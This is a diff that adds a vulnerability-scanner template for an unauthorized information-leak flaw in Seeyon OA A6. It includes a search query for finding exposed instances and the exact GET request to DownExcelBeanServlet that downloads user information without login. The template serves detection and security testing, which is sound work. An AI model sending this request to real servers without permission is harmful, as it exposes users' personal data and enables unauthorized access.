@@ -1,0 +1,18 @@
+name: Seeyon OA A6 DownExcelBeanServlet User information leakage
+manual: true
+query: app="Yonyou-Seeyon-OA" && body="致远协创A6"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
+    expression: response.status == 200 && response.body.bcontains(b"@")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: There is an unauthorized interface in Zhiyuan OA A6, so that any visitor
+    can download the user information in OA
+  tags: Disclosure of Sensitive Information
